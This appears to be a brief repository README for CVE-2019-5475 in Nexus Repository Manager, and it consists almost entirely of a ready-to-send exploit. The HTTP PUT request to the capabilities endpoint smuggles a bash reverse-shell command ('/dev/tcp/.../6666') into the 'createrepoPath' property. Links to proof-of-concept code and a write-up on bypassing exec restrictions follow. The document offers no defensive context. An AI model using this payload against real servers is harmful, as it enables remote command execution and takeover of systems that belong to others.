# CVE-2019-5475-Nexus-Repository-Manager-

## Payload

```
PUT /nexus/service/siesta/capabilities/xxxxxxxxx HTTP/1.1
Host: xxxx.xxxx.com
User-Agent: 
Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Nexus-UI: true
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 188
Authorization: 
Connection: close
Cookie: 

{"typeId":"yum","enabled":true,"properties":[{"key":"createrepoPath","value":"bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/6666 0>&1 ||"}],"id":"0000058a84203a8f","notes":null}
```

### 参考链接：
```
https://cloud.tencent.com/developer/article/1513172
https://qiita.com/shimizukawasaki/items/12f0b69945498e6d5aa9
https://mp.weixin.qq.com/s/E_BEp-yYKtIYAnQ6JP7fmg
https://github.com/shadowsock5/Poc/blob/3b6be229acce3cbc309a6879969cf29750b14acb/nexes-manager/CVE-2019-5475.py
https://blog.spoock.com/2018/11/25/getshell-bypass-exec/
```
